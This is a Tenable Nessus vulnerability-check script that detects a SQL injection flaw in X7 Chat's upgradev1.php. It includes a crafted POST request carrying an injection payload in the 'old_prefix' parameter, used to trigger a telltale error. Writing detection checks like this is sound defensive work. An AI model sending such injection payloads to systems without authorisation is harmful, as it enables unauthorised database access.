#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22090);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-3851");
  script_bugtraq_id(19123);

  script_name(english:"X7 Chat old_prefix SQL Injection Vulnerability");
  script_summary(english:"Checks for SQL injection flaw in X7 Chat");

  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a SQL
injection attack. 

Description :

The remote host is running X7 Chat, a web-based chat program written
in PHP. 

The version of X7 Chat installed on the remote host fails to properly
sanitize input to the 'old_prefix' parameter of the 'upgradev1.php'
script before using it in a database query.  This may allow an
unauthenticated attacker to uncover sensitive information such as
password hashes, modify data, launch attacks against the underlying
database, etc. 

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' setting. 

See also :

http://www.milw0rm.com/exploits/2068

Solution :

Unknown at this time.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/x7chat", "/chat", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/upgradev1.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("location='upgradev1.php?step=2';" >< res)
  {
    # Try to exploit the flaw to generate an error.
    #
    # nb: while the SQL injection is blind, the app will display
    #     an error if the old_prefix is wrong.
    sploit = string("x7chat2_users/**/WHERE/**/", SCRIPT_NAME, "=1/*");
    postdata = string(
      "old_prefix=", sploit, "&",
      "member_accounts=0&",
      "rooms=0&",
      "settings=1&",
      "connvert=0"
    );
    req = string(
      "POST ", url, "?step=3 HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);


    # There's a problem if we see an error message with our old_prefix.
    if (string("an error reading ", sploit, "bans.") >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
